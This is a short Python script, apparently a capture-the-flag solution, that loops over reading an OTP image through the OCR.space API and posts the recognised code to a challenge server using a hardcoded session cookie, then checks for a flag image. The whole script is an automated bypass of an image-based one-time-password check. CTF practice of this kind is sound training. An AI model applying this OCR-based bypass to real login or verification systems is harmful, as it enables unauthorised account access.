import pytesseract
import requests
from io import BytesIO
from PIL import Image
from bs4 import BeautifulSoup as soup  # HTML data structure
from urllib.request import urlopen as uReq  # Web client
import re
import time
import json

url = 'http://challenge.ctf.games:32535/'

wrong_otp = requests.post(url , data={'otp_entry':'133371'} , headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36', 'Cookie':'session=eyJpZCI6IjIyOWQwMWNjLWYxMGItNGYyZC04OTNiLWQ3MDYxNmZiMjFkNCJ9.YUTa3Q.RP9NOVhrzBn6fNOFhpT9QqS1Y-I'})
for i in range(1,100):
	api_key = '<your-api-key>'
	filename = "http://challenge.ctf.games:32535/static/otp.png"
	overlay=False
	language='eng'
	payload = {'isOverlayRequired': overlay,
		'apikey': api_key,
		'language': language,
		'url':filename,
		}
	r = requests.post('https://api.ocr.space/parse/image',data=payload,)
	m = r.content.decode()
	jsonstr = json.loads(m)
	result = jsonstr["ParsedResults"][0]["ParsedText"]
	print(jsonstr["ParsedResults"][0]["ParsedText"])
	print('This is otp{}: '.format(i) , result)
	data = {'otp_entry':'{}'.format(result[:-2])}
	headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36', 'Cookie':'session=eyJpZCI6IjIyOWQwMWNjLWYxMGItNGYyZC04OTNiLWQ3MDYxNmZiMjFkNCJ9.YUTa3Q.RP9NOVhrzBn6fNOFhpT9QqS1Y-I' , 'Accept-Language':'en-US,en;q={}'.format(i)}
	proxies = {"http": "http://127.0.0.1:8080",}
	r2 = requests.post(url ,headers=headers, data=data)
	page_soup2 = soup(r2.text,  'lxml')
	count2 = page_soup2.findAll("p")
	print("count: " , count2)
	r3 = requests.get(url+'static/flag.png')
	print(r3.status_code)
